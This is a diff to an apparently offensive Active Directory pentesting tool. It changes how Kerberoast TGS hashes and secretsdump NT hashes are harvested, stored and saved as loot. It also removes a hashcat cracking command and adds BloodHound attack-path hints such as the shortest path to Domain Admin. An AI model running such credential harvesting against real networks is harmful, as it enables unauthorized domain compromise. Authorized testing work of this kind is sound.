@@ -100,18 +100,16 @@ async def kerberoast(findings: Findings, user: str,
     hashes = extract_kerberoast_hashes(result.combined)
     new = [h for h in hashes if h not in findings.kerberoast_hashes]
     if new:
-        findings.kerberoast_hashes.extend(new)
+        from .. import creds_store, oneliner
+        for hash_str in new:
+            user_part = hash_str.split("$")[3].split("@")[0] if "$" in hash_str else "?"
+            creds_store.add_kerberoast_hash(findings, user_part, hash_str)
+            ui.crit(f"Kerberoast: {user_part}")
         out = loot_dir(findings.target.ip) / "kerberoast_hashes.txt"
         existing = out.read_text().splitlines() if out.exists() else []
         out.write_text("\n".join(sorted(set(existing) | set(new))) + "\n")
-        for hash_str in new:
-            user_part = hash_str.split("$")[3].split("@")[0] if "$" in hash_str else "?"
-            ui.crit(f"Kerberoast: {user_part}")
         ui.good(f"saved {len(new)} TGS hash(es) -> {out}")
-        ui.next_step(
-            f"hashcat -m 13100 {out} /usr/share/wordlists/rockyou.txt",
-            "Kerberoast hashes are mode 13100",
-        )
+        oneliner.emit_for_kerberoast(findings, len(new))
 
 
 async def secretsdump(findings: Findings, user: str,
@@ -146,12 +144,13 @@ async def secretsdump(findings: Findings, user: str,
     out = loot_dir(findings.target.ip) / "secretsdump.txt"
     out.write_text(result.combined)
     nt_count = 0
+    from .. import creds_store
     for line in result.stdout.splitlines():
         parts = line.split(":")
         if len(parts) >= 4 and len(parts[3]) == 32 and all(
             ch in "0123456789abcdef" for ch in parts[3].lower()
         ):
-            findings.nt_hashes.append((parts[0], parts[3]))
+            creds_store.add_nthash(findings, parts[0], parts[3])
             nt_count += 1
     if nt_count:
         ui.crit(f"secretsdump: harvested {nt_count} NT hash(es)")
@@ -192,10 +191,24 @@ async def bloodhound_collect(findings: Findings, user: str,
         return
     zips = list(out_dir.glob("*.zip"))
     if zips:
-        ui.good(f"BloodHound ZIP saved -> {zips[0]}")
-        ui.explain("Open BloodHound GUI -> Upload Data -> drag the ZIP.")
+        ui.crit(f"BloodHound data ready -> {zips[0]}")
+        ui.next_step(
+            f"bloodhound-ce  # then: Upload Data -> drag {zips[0].name}",
+            "Run useful Cypher queries:\n"
+            "  - 'Find Shortest Path to Domain Admin'\n"
+            "  - 'Find Kerberoastable Users'\n"
+            "  - 'Find AS-REP Roastable Users (DontReqPreAuth)'\n"
+            "  - 'Find Users with DCSync Privileges'",
+        )
     else:
-        ui.warn(f"no ZIP produced; check json files in {out_dir}")
+        json_files = list(out_dir.glob("*.json"))
+        if json_files:
+            ui.good(
+                f"BloodHound JSON files saved ({len(json_files)} files) -> {out_dir}"
+            )
+            ui.explain("Drag the json files into BloodHound GUI.")
+        else:
+            ui.warn(f"no BloodHound output produced. Check {out_dir}")
 
 
 async def certipy_adcs(findings: Findings, user: str,
